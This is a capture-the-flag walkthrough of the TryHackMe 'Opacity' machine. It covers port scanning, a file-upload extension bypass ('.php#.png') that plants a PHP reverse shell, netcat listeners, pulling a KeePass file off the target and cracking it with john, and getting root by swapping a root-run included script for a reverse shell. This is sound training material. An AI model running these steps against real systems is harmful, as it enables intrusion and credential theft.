# Opacity | THM
### Difficulty Level: Easy
----------------------------------

First, use nmap scan to find out services and open ports that runs on the machine:

```bash
nmap -p- -T4 -A <machine-ip> -oN opacity.nmap
```

-p- Scans all ports instead of the 1000 common ports.

-T4 - Increases the tempo of the scan.

-A - Aggresive scan to gather more information about the system.

-oN - Saves the output into a file.

The results of the scan:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 16:01 EDT
Nmap scan report for 10.10.134.146
Host is up (0.069s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/14%OT=22%CT=1%CU=33642%PV=Y%DS=2%DC=T%G=Y%TM=65F3
OS:58A1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=10E%TI
OS:=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M
OS:508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B
OS:3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-14T20:05:51
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   74.32 ms 10.9.0.1
2   74.44 ms 10.10.134.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 253.23 seconds
```

There are 4 open ports:

22 - SSH

80 - HTTP

139 - SMB

445 - SMB

Let's see if there any shares on smb server befor I'll try the machine address on the browser.
We can not get any helpful info.

So let's move into the browser and there is a login page:

![image](https://cdn-images-1.medium.com/max/1000/1*p8Orakd7YW4KAXtvtWPEcw.png)

While testing the web app, I started with directories scan with dirsearch: 

```bash
python3 dirsearch.py -u <machine-ip>
```

There is an intersting directory. */cloud*
Navigate there:

![image](https://cdn-images-1.medium.com/max/1000/1*ykpbEERdhg-i09w0aF8T1Q.png)


I tried to upload a reverse shell by using http server with python.

on your machine whithin the directory that rev shell file is located us this command:

```bash
python3 -m http.server
```
By default, this server uses port 8000.

Inside the external image input I use this:

http://<your-ip>:8000/php-reverse-shell.php

The behavior of the site did nothing and I didnt get any log that request was made. so I guess that the file didn't make it to 
the victim machine.

![image](https://cdn-images-1.medium.com/max/1000/1*HgbyvK_SLT1FMCd8DXsXwg.png)


So, maybe there is any validation otn the file extension that command
us to upload only jpg or png file.
so it's time to bypass this machanism with adding another extension to the file
with .php#.png .
so the rev shell file looks like php-reverse-shell.php#.png when you enter it on extenal URL.
By using "#00" sign, the web server interpreter it like php file but let us upload it as png file.
the server might treat the file as a PHP file, potentially executing PHP code, even though it's followed by .png, which could confuse the server or security measures.
Give it a try:

![image](https://cdn-images-1.medium.com/max/1000/1*WiL92ECdp465DleyRQwNTw.png)

After it has been uploaded, do the same but now, set a netcat listener with the port 
that you set on the script.

```bash
nc -lnvp 2222
```

After it has been completed you'll get the reverse shell.

![image](https://cdn-images-1.medium.com/max/1000/1*plOKVBhFVFXjnZGiN68wKw.png)

stabilize it with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

While enumaration process I found .kdbx file within /opt directory.

A KDBX file is a database file format used by password managers, particularly KeePass and its derivatives like KeePassXC.

Let's grab it to our machine with open http server on another port on the victim machine:

```bash
python3 -m http.server 2000
```

Grab the file on your machine with:

wget http://10.10.87.30:2000/dataset.kdbx

![image](https://cdn-images-1.medium.com/max/1000/1*2PRqxPLYzYME7Qqwoz8G4A.png)

I tried to open the file but without any success. google will help me. 
to open keepass file you need to use kpcli so download it with.

```bash
sudo apt install kpcli
```

Open it with kpcli, but you have to provide masterpassword to open it.

```
Type "help <command>" for more detailed help on a command.
kpcli:/> open dataset.kdbx
Provide the master password:
```

keepass2john will help me to provide format that john the ripper can work it (hash).
The next step will be using dictionary attack.

Use this command:

```bash
keepass2john dataset.kdbx > john.txt
```
and for the next step:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
```

![image](https://cdn-images-1.medium.com/max/1000/1*UIhtZOnQm_GVoUlBHwn8wQ.png)


Now, after getting the password we can open the keepass file and 
there is a username and a password.

![image](https://cdn-images-1.medium.com/max/1000/1*97lNYqbZ14fDwNu9nImvDg.png)

remember that there is ssh service open on that machine so try to 
connect it with the new credentials within the keepass file.

```bash
ssh sysadmin@10.10.87.30
```

enter the password and we are in.

grab local.txt flag.

![image](https://cdn-images-1.medium.com/max/1000/1*0vNNZS4TzOanPZkEHrOdQA.png)

Then we need to find a way to be root.

As we can see there is a script.php file own by root and when it runs it calls to 
another file within /lib:

![image](https://cdn-images-1.medium.com/max/1000/1*de31LzlghDjQ23FePAOh_Q.png)

There is no permission to modifey script.php, but if it uses another script, maybe can I 
modifey lib/backup.inc.php ?

```
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
```

I can only read it.

But, I'm the owner of /lib . what if Ill copy the directory to sysadmin home directory? I can modifey /lib/backup.inc.php there, then remove the original file from the original directory, the next step will be inject a reverse shell to the copied file and the last step is to copy the file back to the original directory as modified file!

first step:

```bash
sysadmin@opacity:~/scripts$ cp -r lib ../.
```

move to the copied lib directory:

```
sysadmin@opacity:~/lib$ ls -la
total 132
drwxr-xr-x 2 sysadmin sysadmin  4096 Mar 15 15:59 .
drwxr-xr-x 7 sysadmin sysadmin  4096 Mar 15 15:59 ..
-rw-r--r-- 1 sysadmin sysadmin  9458 Mar 15 15:59 application.php
-rw-r--r-- 1 sysadmin sysadmin   967 Mar 15 15:59 backup.inc.php
-rw-r--r-- 1 sysadmin sysadmin 24514 Mar 15 15:59 bio2rdfapi.php
-rw-r--r-- 1 sysadmin sysadmin 11222 Mar 15 15:59 biopax2bio2rdf.php
-rw-r--r-- 1 sysadmin sysadmin  7595 Mar 15 15:59 dataresource.php
-rw-r--r-- 1 sysadmin sysadmin  4828 Mar 15 15:59 dataset.php
-rw-r--r-- 1 sysadmin sysadmin  3243 Mar 15 15:59 fileapi.php
-rw-r--r-- 1 sysadmin sysadmin  1325 Mar 15 15:59 owlapi.php
-rw-r--r-- 1 sysadmin sysadmin  1465 Mar 15 15:59 phplib.php
-rw-r--r-- 1 sysadmin sysadmin 10548 Mar 15 15:59 rdfapi.php
-rw-r--r-- 1 sysadmin sysadmin 16469 Mar 15 15:59 registry.php
-rw-r--r-- 1 sysadmin sysadmin  6862 Mar 15 15:59 utils.php
-rwxr-xr-x 1 sysadmin sysadmin  3921 Mar 15 15:59 xmlapi.ph

```

next step:

Inject php reverse shell pentestmonkey to backup.inc.php

modified it to your ip and port number.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

third step:
remove the original file from /scripts/lib/backup.inc.php

```bash
sysadmin@opacity:~/scripts/lib$ rm backup.inc.php
```
After that, copy the modified file back to /scripts/lib/ :

```
sysadmin@opacity:~/lib$ cp backup.inc.php /home/sysadmin/scripts/lib
```

set netcat listener:

```bash
nc -lnvp 1234
```

Then wait a little... and there is a shell as root!

![image](https://cdn-images-1.medium.com/max/1000/1*JIdlS-DllYwzAhGuw5avuQ.png)

Grab proof.txt flag.

```bash
cat /root/proof.txt
```

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***












































































